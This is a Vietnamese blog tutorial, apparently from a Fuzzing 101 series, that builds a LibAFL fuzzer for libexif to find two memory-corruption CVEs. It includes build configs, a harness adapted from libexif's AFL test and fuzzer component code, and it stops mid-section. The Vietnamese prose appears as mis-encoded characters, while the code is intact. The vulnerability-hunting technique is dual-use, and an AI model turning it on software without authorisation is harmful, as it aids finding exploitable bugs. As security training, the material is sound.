Makefile.toml v√¨ s·ª± ti·ªán l·ª£i c·ªßa n√≥ trong vi·ªác build nh·ªØng task m√¨nh c·∫ßn cho fuzzing\nN·∫øu b·∫°n ch∆∞a bi·∫øt Makefile.toml l√† g√¨ th√¨ m√¨nh suggest b·∫°n xem blog tr∆∞·ªõc c·ªßa m√¨nh, m√¨nh n√≥i kh√° k·ªπ v·ªÅ tool n√†y https://hackmd.io/jW6RBTbjTfqjGxRvR-DiLQ#Makefiletoml\n[tasks.clean] dependencies = [\u0026#34;cargo-clean\u0026#34;, \u0026#34;libexif-clean\u0026#34;, \u0026#34;build-clean\u0026#34;] [tasks.cargo-clean] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;clean\u0026#34;] [tasks.libexif-clean] command = \u0026#34;make\u0026#34; args = [\u0026#34;-C\u0026#34;, \u0026#34;libexif\u0026#34;, \u0026#34;clean\u0026#34;, \u0026#34;-i\u0026#34;] [tasks.build-clean] command = \u0026#34;rm\u0026#34; args = [\u0026#34;-rf\u0026#34;, \u0026#34;build/\u0026#34;] [tasks.build] dependencies = [\u0026#34;clean\u0026#34;, \u0026#34;build-libexif\u0026#34;] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;build\u0026#34;] [tasks.build-libexif] cwd = \u0026#34;libexif\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; autoreconf -fi ./configure --enable-shared=no --prefix=\u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/../build/\u0026#34; make -i make install -i \u0026#34;\u0026#34;\u0026#34; Run the build\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ cargo make build Confirm build th√†nh c√¥ng\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ ls build/lib/libexif.a build/lib/libexif.a Get into fuzzing # Setting up fuzzer # ~/fuzzing-101-solutions/exercise-2/Cargo.toml\n[dependencies] libafl = {version = \u0026#34;0.10.1\u0026#34;} libafl_cc = {version = \u0026#34;0.10.1\u0026#34;} libafl_targets = {version = \u0026#34;0.10.1\u0026#34;, features = [ \u0026#34;libfuzzer\u0026#34;, \u0026#34;sancov_pcguard_hitcounts\u0026#34;, \u0026#34;sancov_cmplog\u0026#34;, ]} clap = \u0026#34;3.0.0-beta.5\u0026#34; [lib] name=\u0026#34;exercisetwo\u0026#34; crate-type=[\u0026#34;staticlib] Get some corpus # gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ mkdir corpus solutions ·ªû trong libexif repo h·ªç ƒë·ªÉ s·∫µn m·ªôt s·ªë file jpg ƒë·ªÉ l√†m test data, ƒë·ªÉ thu·∫≠n ti·ªán th√¨ ch√∫ng ta s·∫Ω l·∫•y c√°c file jpg ƒë√≥ v·ªÅ l√†m test case cho fuzzer.\nfuzzing-101-solutions/exercise-2/corpus\ngit clone --no-checkout --filter=blob:none https://github.com/libexif/libexif.git fuzzing-101-solutions/exercise-2/corpus\ncd libexif git checkout master -- test/testdata fuzzing-101-solutions/exercise-2/corpus/libexif\nmv test/testdata/*.jpg ../ cd .. rm -rf libexif V√† ƒë√¢y l√† nh·ªØng file ƒë·ªÉ l√†m test case cho fuzzer\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2/corpus\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2/corpus$ ls -la total 72 drwxrwxr-x 2 gh0st gh0st 4096 Thg 12 29 14:55 . drwxrwxr-x 7 gh0st gh0st 4096 Thg 12 29 14:55 .. -rw-rw-r-- 1 gh0st gh0st 2026 Thg 12 29 14:54 canon_makernote_variant_1.jpg -rw-rw-r-- 1 gh0st gh0st 3978 Thg 12 29 14:54 fuji_makernote_variant_1.jpg -rw-rw-r-- 1 gh0st gh0st 2850 Thg 12 29 14:54 olympus_makernote_variant_2.jpg -rw-rw-r-- 1 gh0st gh0st 6140 Thg 12 29 14:54 olympus_makernote_variant_3.jpg -rw-rw-r-- 1 gh0st gh0st 11458 Thg 12 29 14:54 olympus_makernote_variant_4.jpg -rw-rw-r-- 1 gh0st gh0st 9604 Thg 12 29 14:54 olympus_makernote_variant_5.jpg -rw-rw-r-- 1 gh0st gh0st 1346 Thg 12 29 14:54 pentax_makernote_variant_2.jpg -rw-rw-r-- 1 gh0st gh0st 1918 Thg 12 29 14:54 pentax_makernote_variant_3.jpg -rw-rw-r-- 1 gh0st gh0st 9132 Thg 12 29 14:54 pentax_makernote_variant_4.jpg Executor # ƒê·ªëi v·ªõi m·ªói lo·∫°i fuzzer, v·ªÅ concept c·ªßa vi·ªác th·ª±c thi c√°c ƒëo·∫°n m√£ c·∫ßn fuzz d∆∞·ªõi m·ªói l·∫ßn test s·∫Ω kh√°c nhau v·ªõi m·ªói lo·∫°i fuzzer, v√≠ d·ª• nh∆∞ ƒë·ªëi v·ªõi hypervisor-based fuzzer nh∆∞ l√† kAFL th√¨ m·ªói test case n√≥ s·∫Ω ch·∫°y d∆∞·ªõi c√°c snapshot. ƒê·ªëi v·ªõi libAFL fuzzer m·ªói l·∫ßn ch·∫°y test case n√≥ s·∫Ω g·ªçi h√†m \u0026ldquo;harness\u0026rdquo;, c√≥ nghƒ©a l√† ch√∫ng ta g·ªçi h√†m c·∫ßn fuzz trong file target v·ªõi c√°c tham s·ªë c·ª• th·ªÉ d∆∞·ªõi m·ªói l·∫ßn ch·∫°y fuzz.\nƒê·ªëi v·ªõi b√†i n√†y th√¨ ch√∫ng ta ti·ªán h∆°n, v√¨ trong test folder trong repo c·ªßa libexif, h·ªç ƒë√£ vi·∫øt 1 file harness cho ch√∫ng ta ƒë·ªÉ test, test-fuzzer-persistent.c.\nN√¥m na trong file test-fuzzer-persistent.c th√¨ n√≥ ƒë∆∞·ª£c vi·∫øt d√†nh cho afl fuzzer, v·∫≠y n√™n ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng tr·ª±c ti·∫øp n√≥ lu√¥n.\n/**file test-fuzzer-persistent.c * from test-parse.c and test-mnote.c * * \\brief Persistent AFL fuzzing binary (reaches 4 digits execs / second) * * Copyright (C) 2007 Hans Ulrich Niedermann \u0026lt;gp@n-dimensional.de\u0026gt; * Copyright 2002 Lutz Mueller \u0026lt;lutz@users.sourceforge.net\u0026gt; * * This library is free software; you can redistribute it and/or * modify it under the terms of the GNU Lesser General Public * License as published by the Free Software Foundation; either * version 2 of the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU * Lesser General Public License for more details. * * You should have received a copy of the GNU Lesser General Public * License along with this library; if not, write to the * Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, * Boston, MA 02110-1301 USA. * * SPDX-License-Identifier: LGPL-2.0-or-later */ #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026#34;libexif/exif-data.h\u0026#34; #include \u0026#34;libexif/exif-loader.h\u0026#34; #include \u0026#34;libexif/exif-system.h\u0026#34; __AFL_FUZZ_INIT(); #undef USE_LOG #ifdef USE_LOG static void logfunc(ExifLog *log, ExifLogCode code, const char *domain, const char *format, va_list args, void *data) { fprintf( stderr, \u0026#34;test-fuzzer: code=%d domain=%s \u0026#34;, code, domain); vfprintf (stderr, format, args); fprintf (stderr, \u0026#34;\\n\u0026#34;); } #endif /** Callback function handling an ExifEntry. */ void content_foreach_func(ExifEntry *entry, void *callback_data); void content_foreach_func(ExifEntry *entry, void *UNUSED(callback_data)) { char buf[2001]; /* ensure \\0 */ buf[sizeof(buf)-1] = 0; buf[sizeof(buf)-2] = 0; exif_tag_get_name(entry-\u0026gt;tag); exif_format_get_name(entry-\u0026gt;format); exif_entry_get_value(entry, buf, sizeof(buf)-1); if (buf[sizeof(buf)-2] != 0) abort(); } /** Callback function handling an ExifContent (corresponds 1:1 to an IFD). */ void data_foreach_func(ExifContent *content, void *callback_data); void data_foreach_func(ExifContent *content, void *callback_data) { printf(\u0026#34; Content %p: ifd=%d\\n\u0026#34;, (void *)content, exif_content_get_ifd(content)); exif_content_foreach_entry(content, content_foreach_func, callback_data); } static int test_exif_data (ExifData *d) { unsigned int i, c; char v[1024]; ExifMnoteData *md; fprintf (stdout, \u0026#34;Byte order: %s\\n\u0026#34;, exif_byte_order_get_name (exif_data_get_byte_order (d))); md = exif_data_get_mnote_data (d); if (!md) { fprintf (stderr, \u0026#34;Could not parse maker note!\\n\u0026#34;); return 1; } exif_mnote_data_ref (md); exif_mnote_data_unref (md); c = exif_mnote_data_count (md); for (i = 0; i \u0026lt; c; i++) { const char *name = exif_mnote_data_get_name (md, i); if (!name) continue; exif_mnote_data_get_name (md, i); exif_mnote_data_get_title (md, i); exif_mnote_data_get_description (md, i); exif_mnote_data_get_value (md, i, v, sizeof (v)); } return 0; } /** Main program. */ int main(const int argc, const char *argv[]) { int\ti; ExifData\t*d; ExifLoader\t*loader = exif_loader_new(); unsigned int\txbuf_size; unsigned char\t*xbuf; FILE\t*f; struct\tstat stbuf; #ifdef USE_LOG ExifLog\t*log = exif_log_new (); exif_log_set_func(log, logfunc, NULL); #endif #ifdef __AFL_HAVE_MANUAL_CONTROL __AFL_INIT(); #endif unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF; // must be after __AFL_INIT // and before __AFL_LOOP! while (__AFL_LOOP(10000)) { int len = __AFL_FUZZ_TESTCASE_LEN; // don\u0026#39;t use the macro directly in a call! d = exif_data_new_from_data(buf, len); /* try the exif loader */ #ifdef USE_LOG exif_data_log (d, log); #endif exif_data_foreach_content(d, data_foreach_func, NULL); test_exif_data (d); xbuf = NULL; exif_data_save_data (d, \u0026amp;xbuf, \u0026amp;xbuf_size); free (xbuf); exif_data_set_byte_order(d, EXIF_BYTE_ORDER_INTEL); xbuf = NULL; exif_data_save_data (d, \u0026amp;xbuf, \u0026amp;xbuf_size); free (xbuf); exif_data_unref(d); #if 0 /* try the exif data writer ... different than the loader */ exif_loader_write(loader, buf, len); d = exif_loader_get_data(loader); exif_data_foreach_content(d, data_foreach_func, NULL); test_exif_data (d); exif_loader_unref(loader); exif_data_unref(d); #endif } return 0; } Tuy nhi√™n ch√∫ng ta c·∫ßn s·ª≠a ƒë·ªïi m·ªôt ch√∫t x√≠u ƒë·ªÉ ph√π h·ª£p v·ªõi ng·ªØ c·∫£nh trong b√†i n√†y.\nCh√∫ng ta c·∫ßn ph·∫£i s·ª≠a nh·ªØng l·ªói li√™n quan t·ªõi c√°c phi√™n b·∫£n kh√°c nhau c·ªßa libexif ƒëang ƒë∆∞·ª£c s·ª≠ d·ª•ng Lo·∫°i b·ªè afl macros, c√°c h√†m in ra output nh∆∞ exif_data_log, fprintf , printf, logfunc. ƒê·ªïi t√™n h√†m main th√†nh LLVMFuzzerTestOneInput, m·ªói l·∫ßn ch·∫°y fuzz th√¨ fuzzer s·∫Ω g·ªçi t·ªõi h√†m callback LLVMFuzzerTestOneInput. ƒê·ªëi v·ªõi h√†m main th√¨ m√¨nh s·∫Ω ƒë·ªÉ n√≥ ·ªü trong ifdef, endif v√¨ ch√∫ng ta c·∫ßn h√†m main ƒë·ªÉ ƒë·ªçc file corpus v√† g·ªçi h√†m LLVMFuzzerTestOneInput, h√†m main s·∫Ω ƒë∆∞·ª£c compile khi m√† ch√∫ng ta ƒë√£ chu·∫©n b·ªã xong v√¨ th·∫ø n√™n h√†m main s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong ifdef LLVMFuzzerTestOneInput.c\n#include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026#34;libexif/exif-data.h\u0026#34; #include \u0026#34;libexif/exif-loader.h\u0026#34; #define UNUSED(param) UNUSED_PARAM_##param __attribute__((unused)) // __AFL_FUZZ_INIT(); void content_foreach_func(ExifEntry *entry, void *callback_data); void content_foreach_func(ExifEntry *entry, void *UNUSED(callback_data)) { char buf[2001]; /* ensure \\0 */ buf[sizeof(buf)-1] = 0; buf[sizeof(buf)-2] = 0; exif_tag_get_name(entry-\u0026gt;tag); exif_format_get_name(entry-\u0026gt;format); exif_entry_get_value(entry, buf, sizeof(buf)-1); if (buf[sizeof(buf)-2] != 0) abort(); } /** Callback function handling an ExifContent (corresponds 1:1 to an IFD). */ void data_foreach_func(ExifContent *content, void *callback_data); void data_foreach_func(ExifContent *content, void *callback_data) { printf(\u0026#34; Content %p: ifd=%d\\n\u0026#34;, (void *)content, exif_content_get_ifd(content)); exif_content_foreach_entry(content, content_foreach_func, callback_data); } static int test_exif_data (ExifData *d) { unsigned int i, c; char v[1024]; ExifMnoteData *md; fprintf (stdout, \u0026#34;Byte order: %s\\n\u0026#34;, exif_byte_order_get_name (exif_data_get_byte_order (d))); md = exif_data_get_mnote_data (d); if (!md) { fprintf (stderr, \u0026#34;Could not parse maker note!\\n\u0026#34;); return 1; } exif_mnote_data_ref (md); exif_mnote_data_unref (md); c = exif_mnote_data_count (md); for (i = 0; i \u0026lt; c; i++) { const char *name = exif_mnote_data_get_name (md, i); if (!name) continue; exif_mnote_data_get_name (md, i); exif_mnote_data_get_title (md, i); exif_mnote_data_get_description (md, i); exif_mnote_data_get_value (md, i, v, sizeof (v)); } return 0; } // Main program. -\u0026gt; LLVMFuzzerTestOneInput int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size){ int\ti; ExifData\t*d; ExifLoader\t*loader = exif_loader_new(); unsigned int\txbuf_size; unsigned char\t*xbuf; FILE\t*f; struct\tstat stbuf; #ifdef USE_LOG ExifLog\t*log = exif_log_new (); exif_log_set_func(log, logfunc, NULL); #endif d = exif_data_new_from_data(data, size); /* try the exif loader */ #ifdef USE_LOG exif_data_log (d, log); #endif exif_data_foreach_content(d, data_foreach_func, NULL); test_exif_data (d); xbuf = NULL; exif_data_save_data (d, \u0026amp;xbuf, \u0026amp;xbuf_size); free (xbuf); exif_data_set_byte_order(d, EXIF_BYTE_ORDER_INTEL); xbuf = NULL; exif_data_save_data (d, \u0026amp;xbuf, \u0026amp;xbuf_size); free (xbuf); exif_data_unref(d); return 0; } #ifdef TRIAGE_TESTER int main(int argc, char* argv[]){ struct stat st; char *filename = argv[1]; stat(filename,\u0026amp;st); FILE *fd = fopen(filename,\u0026#34;rb\u0026#34;); char *buffer = (char*)malloc(sizeof(char)*(st.st_size)); fread(buffer,sizeof(char),st.st_size,fd); LLVMFuzzerTestOneInput(buffer,st.st_size); free(buffer); fclose(fd); } #endif Compiler # Ch√∫ng ta c·∫ßn m·ªôt file ƒë·ªÉ compile t·∫•t c·∫£ nh·ªØng g√¨ ch√∫ng ta c·∫ßn ch·∫°y fuzz.\n·ªû trong file Cargo.toml ch√∫ng ta c·∫ßn ch·ªânh l·∫°i m·ªôt x√≠u, th√™m v√†o libafl_cc v√† libafl_target ·ªü trong dependency.\n[dependencies] libafl = {version = \u0026#34;0.10.1\u0026#34;} libafl_cc = {version = \u0026#34;0.10.1\u0026#34;} libafl_targets = {version = \u0026#34;0.10.1\u0026#34;, features = [ \u0026#34;libfuzzer\u0026#34;, \u0026#34;sancov_pcguard_hitcounts\u0026#34;, \u0026#34;sancov_cmplog\u0026#34;, ]} clap = \u0026#34;3.0.0-beta.5\u0026#34; [lib] name=\u0026#34;exercisetwo\u0026#34; crate-type=[\u0026#34;staticlib\u0026#34;] Ti·∫øp theo ƒë·ªëi v·ªõi excercise-2_compiler.rs. Sau khi l∆∞·ªõt m·ªôt v√≤ng trong repo c·ªßa LibAFL th√¨ m√¨nh nh·∫≠n ra trong m·ªói example c·ªßa libafl h·ªç ƒë·ªÅu d√πng chung m·ªôt template cho compiler. V√≠ d·ª• nh∆∞ b√™n d∆∞·ªõi\n// build.rs use std::env; fn main() { let out_dir = env::var_os(\u0026#34;OUT_DIR\u0026#34;).unwrap(); let out_dir = out_dir.to_string_lossy().to_string(); println!(\u0026#34;cargo:rerun-if-changed=harness.c\u0026#34;); // Enforce clang for its -fsanitize-coverage support. std::env::set_var(\u0026#34;CC\u0026#34;, \u0026#34;clang\u0026#34;); std::env::set_var(\u0026#34;CXX\u0026#34;, \u0026#34;clang++\u0026#34;); cc::Build::new() // Use sanitizer coverage to track the edges in the PUT .flag(\u0026#34;-fsanitize-coverage=trace-pc-guard,trace-cmp\u0026#34;) // Take advantage of LTO (needs lld-link set in your cargo config) //.flag(\u0026#34;-flto=thin\u0026#34;) .flag(\u0026#34;-Wno-sign-compare\u0026#34;) .file(\u0026#34;./harness.c\u0026#34;) .compile(\u0026#34;harness\u0026#34;); println!(\u0026#34;cargo:rustc-link-search=native={}\u0026#34;, \u0026amp;out_dir); println!(\u0026#34;cargo:rerun-if-changed=build.rs\u0026#34;); } N√™n m√¨nh ch·ªâ c·∫ßn s·ª≠a ƒë·ªïi l·∫°i m·ªôt x√≠u ƒë·ªÉ ph√π h·ª£p cho b√†i n√†y hehe.\nexercise-2_compiler.rs\nuse libafl_cc::{ClangWrapper, CompilerWrapper}; use std::env; pub fn main() { let cwd = env::current_dir().unwrap(); let args: Vec\u0026lt;String\u0026gt; = env::args().collect(); let mut cc = ClangWrapper::new(); if let Some(code) = cc .cpp(false) .silence(true) .parse_args(\u0026amp;args) .expect(\u0026#34;Failed to parse the command line\u0026#34;) .link_staticlib(\u0026amp;cwd, \u0026#34;exercisetwo\u0026#34;) .add_arg(\u0026#34;-fsanitize-coverage=trace-pc-guard\u0026#34;) .add_arg(\u0026#34;-fsanitize=address\u0026#34;) .run() .expect(\u0026#34;Failed to run the wrapped compiler\u0026#34;) { std::process::exit(code); } } ·ªû ƒë√¢y m√¨nh th√™m v√†o\n-fsanitize-coverage=trace-pc-guard ƒë∆∞·ª£c th√™m v√†o ƒë·ªÉ track edge coverage, n√≥ l√† SanitizerCoverage -fsanitize=address ƒë∆°n gi·∫£n n√≥ l√† AddressSanitizer ƒë·ªÉ detect c√°c memory errors: Double free, UAF, OOB memory access. ·ªû trong exercise l·∫ßn n√†y target c·ªßa ch√∫ng ta ƒë√≥ l√† c·∫£ 2 CVEs ƒë·ªÅu li√™n quan t·ªõi c√°c l·ªói c·ªßa memory access (arbitrary read \u0026amp; write), tuy nhi√™n m·ªôt s·ªë memory error s·∫Ω kh√¥ng g√¢y ra crash nh∆∞ng ch√∫ng v·∫´n c√≥ kh·∫£ nƒÉng t√°c ƒë·ªông nguy hi·ªÉm. Nh·ªØng l·ªói nh∆∞ th·∫ø n√†y th√¨ ASAN s·∫Ω l√† 1 s·ª± l·ª±a ch·ªçn ph√π h·ª£p.\n·ªû trong ng·ªØ c·∫£nh real-world stuff th√¨ vi·ªác ch·∫°y ASAN s·∫Ω c·∫ßn t·ªõi √≠t nh·∫•t ch·∫°y 2 fuzzer, fuzz target v·ªõi c√°c config kh√°c nhau v√† fuzz target v·ªõi ASAN. Vi·ªác ch·∫°y ASAN s·∫Ω khi·∫øn cho performance cost tƒÉng l√™n, n√≥ s·∫Ω g√¢y ch·∫≠m qu√° tr√¨nh ch·∫°y fuzz c·ªßa ch√∫ng ta.\nMakefile.toml # Tr∆∞·ªõc m·∫Øt ch√∫ng ta c·∫ßn c√≥ 1 file lib.rs ƒë·ªÉ tr√°nh b·ªã l·ªói trong qu√° tr√¨nh build.\nexercise-2/src/lib.rs\nuse libafl::Error; use libafl_targets::libfuzzer_test_one_input; #[no_mangle] fn libafl_main() -\u0026gt; Result\u0026lt;(), Error\u0026gt; { libfuzzer_test_one_input(\u0026amp;[]); Ok(()) } M√¨nh s·∫Ω ch·ªânh s·ª≠a n·ªët trong makefile.toml ƒë·ªÉ ho√†n th√†nh m·ªçi th·ª©.\nexercise-2/Makefile.toml\n# tasks [tasks.clean] dependencies = [\u0026#34;cargo-clean\u0026#34;,\u0026#34;build-dir-clean\u0026#34;,\u0026#34;libexif-clean\u0026#34;] [tasks.build] dependencies = [\u0026#34;clean\u0026#34;, \u0026#34;build-compilers\u0026#34;, \u0026#34;copy-project-to-build\u0026#34;, \u0026#34;build-libexif\u0026#34;, \u0026#34;build-fuzzer\u0026#34;] # clean up tasks [tasks.cargo-clean] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;clean\u0026#34;] [tasks.libexif-clean] command = \u0026#34;make\u0026#34; args = [\u0026#34;-C\u0026#34;, \u0026#34;libexif\u0026#34;, \u0026#34;clean\u0026#34;, \u0026#34;-i\u0026#34;] [tasks.build-dir-clean] command = \u0026#34;rm\u0026#34; args = [\u0026#34;-rf\u0026#34;, \u0026#34;build/\u0026#34;] # task build [tasks.build-compilers] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;build\u0026#34;, \u0026#34;--release\u0026#34;] [tasks.copy-project-to-build] script = \u0026#34;\u0026#34;\u0026#34; mkdir -p build/ cp ${CARGO_MAKE_WORKING_DIRECTORY}/../target/release/ex2_compiler build/ cp ${CARGO_MAKE_WORKING_DIRECTORY}/../target/release/libexercisetwo.a build/ \u0026#34;\u0026#34;\u0026#34; [tasks.build-fuzzer] cwd = \u0026#34;build\u0026#34; command = \u0026#34;./ex2_compiler\u0026#34; args = [\u0026#34;-I\u0026#34;, \u0026#34;../libexif/libexif\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;../libexif\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;fuzzer\u0026#34;, \u0026#34;../harness.c\u0026#34;, \u0026#34;lib/libexif.a\u0026#34;] [tasks.build-triager] cwd = \u0026#34;build\u0026#34; command = \u0026#34;./ex2_compiler\u0026#34; args = [\u0026#34;-D\u0026#34;, \u0026#34;TRIAGE_TESTER\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;../libexif/libexif\u0026#34;, \u0026#34;-I\u0026#34;, \u0026#34;../libexif\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;triager\u0026#34;, \u0026#34;../harness.c\u0026#34;, \u0026#34;lib/libexif.a\u0026#34;] [tasks.build-libexif] cwd = \u0026#34;libexif\u0026#34; env = { \u0026#34;CC\u0026#34; = \u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/build/ex2_compiler\u0026#34;, \u0026#34;LLVM_CONFIG\u0026#34; = \u0026#34;llvm-config-15\u0026#34;} script = \u0026#34;\u0026#34;\u0026#34; autoreconf -fi ./configure --enable-shared=no --prefix=\u0026#34;${CARGO_MAKE_WORKING_DIRECTORY}/../build/\u0026#34; make -i make install -i \u0026#34;\u0026#34;\u0026#34; Sau ƒë√≥ m√¨nh s·∫Ω ch·∫°y cargo make build v√† k·∫øt qu·∫£ sau khi ch·∫°y ƒë√≥ l√† file fuzzer trong exercise-2/build\nWriting Fuzzer # Gi·ªëng nh∆∞ exercise 1, m√¨nh s·∫Ω s·ª≠ d·ª•ng c√°c component t∆∞∆°ng t·ª± v·ªõi b√†i tr∆∞·ªõc nh∆∞ng s·∫Ω ph·∫£i c√≥ ch·ªânh s·ª≠a m·ªôt x√≠u ch·ª© kh√¥ng th·ªÉ b√™n nguy√™n xi ƒë∆∞·ª£c.\n1st Component: Corpus \u0026amp; Input # V·ªÅ ph·∫ßn n√†y th√¨ kh√¥ng c√≥ g√¨ kh√°c bi·ªát v·ªõi b√†i tr∆∞·ªõc, m√¨nh v·∫´n s·ª≠ d·ª•ng\nOnDiskCorpus InMemoryCorpus BytesInput N·∫øu nh∆∞ b·∫°n ch∆∞a bi·∫øt 3 c√°i tr√™n l√† c√°i g√¨ th√¨ m√¨nh recommend xem l·∫°i b√†i post n√†y 1st Component: Corpus \u0026amp; Input, m√¨nh ƒë√£ gi·∫£i th√≠ch kh√° k·ªπ v·ªÅ 3 c√°i tr√™n.\n// path to input corpus let corpus_dirs = vec![PathBuf::from(\u0026#34;./corpus\u0026#34;)]; // Corpus that will be evolved, we keep it in memory for performance let input_corpus = InMemoryCorpus::\u0026lt;BytesInput\u0026gt;::new(); // Corpus in which we store solutions on disk so the user can get them after stopping the fuzzer let solutions_corpus = OnDiskCorpus::new(PathBuf::from(\u0026#34;./solutions\u0026#34;)).unwrap(); 2nd Component: Observer # M√¨nh c≈©ng s·∫Ω t√°i s·ª≠ d·ª•ng l·∫°i c√°c component c·ªßa b√†i tr∆∞·ªõc v√¨ n√≥ kh√¥ng c√≥ g√¨ c·∫ßn ph·∫£i ch·ªânh s·ª≠a ho·∫∑c thay ƒë·ªïi.\nStdMapObserver: V√¨ l·∫ßn n√†y m√¨nh s·∫Ω s·ª≠ d·ª•ng InMemoryExecutor(m√¨nh s·∫Ω n√≥i ·ªü b√™n d∆∞·ªõi) n√™n vi·ªác s·ª≠ d·ª•ng StdMapObserver l√† c·∫ßn thi·∫øt cho vi·ªác l·∫•y l·∫°i tr·∫°ng th√°i c·ªßa coverage map. Ch√∫ng ta kh√¥ng th·ªÉ s·ª≠ d·ª•ng ConstMapObserver v√¨ Max Edges Map kh√¥ng th·ªÉ x√°c ƒë·ªãnh ƒë∆∞·ª£c trong qu√° tr√¨nh compile. HitcountsMapObserver ƒë·ªÉ tƒÉng th√™m edge coverage ƒë·∫°t ƒë∆∞·ª£c t·ª´ StdMapObserver. ƒê·ªÉ x√°c ƒë·ªãnh ƒëo·∫°n m√£ n√†o c√≥ l·ªói trong flow c·ªßa m√¨nh. TimeObserver, cung c·∫•p th√¥ng tin v·ªÅ th·ªùi gian trong qu√° tr√¨nh ch·∫°y fuzz c·ªßa testcase hi·ªán t·∫°i, h·ªó tr·ª£ cho c√°c component ti·∫øp theo. Xem l·∫°i b√†i tr∆∞·ªõc c·ªßa m√¨nh 2nd Component: Observer ƒë·ªÉ hi·ªÉu r√µ h∆°n v·ªÅ HitcountsMapObserver v√† TimeObserver.\nlet edges_observer = HitcountsMapObserver::new(unsafe { std_edges_map_observer(\u0026#34;edges\u0026#34;) }); // Create an observation channel to keep track of the execution time and previous runtime let time_observer = TimeObserver::new(\u0026#34;time\u0026#34;); 3rd Component: Feedback # MaxMapFeedback x√°c ƒë·ªãnh xem li·ªáu coverage map hi·ªán t·∫°i c√≥ l·ªõn h∆°n so v·ªõi coverage map m√† ch√∫ng ta ƒë∆∞a v√†o t·ª´ ƒë·∫ßu r·ªìi t·ª´ ƒë√≥ x√°c ƒë·ªãnh test case hi·ªán t·∫°i c√≥ ph√π h·ª£p ƒë·ªÉ ƒë∆∞a v√†o input ti·∫øp theo hay kh√¥ng. TimeFeedback theo d√µi th·ªùi gian c·ªßa qu√° tr√¨nh th·ª±c thi test case hi·ªán t·∫°i, v√† x√°c ƒë·ªãnh xem th·ªùi gian hi·ªán t·∫°i c√≥ \u0026ldquo;interesting\u0026rdquo; hay kh√¥ng ƒë·ªÉ ƒë∆∞a test case hi·ªán t·∫°i l√†m input ti·∫øp theo. M√¨nh n√≥i r√µ h∆°n trong b√†i tr∆∞·ªõc 3nd Component: Feedback\nlet mut feedback = feedback_or!( // New maximization map feedback (attempts to maximize the map contents) linked to the // edges observer and the feedback state. This one will track indexes, but will not track // novelties, i.e. tracking(... true, false). MaxMapFeedback::tracking(\u0026amp;edges_observer, true, false), // Time feedback, this one does not need a feedback state, nor does it ever return true for // is_interesting, However, it does keep track of testcase execution time by way of its // TimeObserver TimeFeedback::with_observer(\u0026amp;time_observer) ); let mut objective = feedback_and_fast!(CrashFeedback::new(), MaxMapFeedback::new(\u0026amp;edges_observer)); Vi·ªác m√¨nh s·ª≠ d·ª•ng CrashFeedback ·ªü ƒë√¢y ƒë√≥ l√† fuzzer s·∫Ω x√°c ƒë·ªãnh n·∫øu input c·ªßa test case hi·ªán t·∫°i g√¢y crash th√¨ n√≥ s·∫Ω l√† \u0026ldquo;interesting\u0026rdquo; input v√† s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o l√†m corpus cho input ti·∫øp theo sau khi ƒë√£ mutated.\n4th Component: State # StdState n√≥ s·∫Ω l·∫•y tr·∫°ng th√°i hi·ªán t·∫°i c·ªßa fuzzer v√† n√≥ l√† c√°i m√† m√¨nh th·∫•y s·ª≠ d·ª•ng ƒë∆∞·ª£c trong b√†i l·∫ßn n√†y. let mut state = state.unwrap_or_else(|| { StdState::new( // random number generator with a time-based seed StdRand::with_seed(current_nanos()), input_corpus, solutions_corpus, // States of the feedbacks that store the data related to the feedbacks that should be // persisted in the State. \u0026amp;mut feedback, \u0026amp;mut objective, ) .unwrap() }); 5th Component: Monitor # T∆∞∆°ng t·ª± v·ªõi post tr∆∞·ªõc, m√¨nh s·∫Ω s·ª≠ d·ª•ng SimpleMonitor v√† component n√†y ch·ªâ in ra terminal c√°c th√¥ng tin c·∫ßn thi·∫øt cho ch√∫ng ta.\nlet monitor = MultiMonitor::new(|s| { println!(\u0026#34;{}\u0026#34;, s); }); 6th Component: EventManager # B√†i l·∫ßn tr∆∞·ªõc m√¨nh ƒë√£ s·ª≠ d·ª•ng SimpleEventManager nh∆∞ng l·∫ßn n√†y m√¨nh s·∫Ω s·ª≠ d·ª•ng LlmpRestartingEventManager ƒë·ªÉ tƒÉng performance cho fuzzer. N√≥ ho·∫°t ƒë·ªông d·ª±a tr√™n SimpleEventManager nh∆∞ng v·ªõi m·ªói child process b·ªã crash LlmpRestartingEventManager s·∫Ω fork ra m·ªôt process m·ªõi ƒë·ªÉ ti·∫øp t·ª•c qu√° tr√¨nh fuzzing\nlet (state, mut mgr) = match setup_restarting_mgr_std(monitor, 1337, EventConfig::AlwaysUnique) { Ok(res) =\u0026gt; res, Err(err) =\u0026gt; match err { Error::ShuttingDown =\u0026gt; { return Ok(()); } _ =\u0026gt; { panic!(\u0026#34;Failed to setup the restarting manager: {}\u0026#34;, err); } }, }; 7th Component: 